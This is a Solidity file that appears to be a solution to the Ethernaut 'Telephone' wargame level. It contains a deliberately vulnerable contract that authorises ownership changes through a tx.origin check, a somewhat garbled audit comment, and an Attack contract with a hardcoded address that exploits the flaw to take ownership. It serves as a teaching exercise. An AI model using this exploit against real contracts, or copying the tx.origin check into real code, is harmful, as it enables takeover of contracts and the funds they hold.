// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /*
    * @Audit - tx.origin is the original sender of the transaction, and msg.sender is the
    * current sender of the transaction. The changeOwner function will change the ownership
    * by creating a attack contract and call the changeOwner function in the attack contract.
    * From Telephone's perspective, the msg.sender is the attack contract, and tx.origin is
    * msg.sender. So the owner will be changed to the attack contract's attack function and set owner to msg.sender.
    */
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    Telephone telephone = Telephone(0x28077b51fFA35Ba716626Dc4dAF8174c6cAd26Ba);

    function attack() public {
        // telephone.changeOwner(0x17Ed2BAF584365904e1a376d9ec7F8Db1aB7bAF6);
        telephone.changeOwner(msg.sender);
    }
}
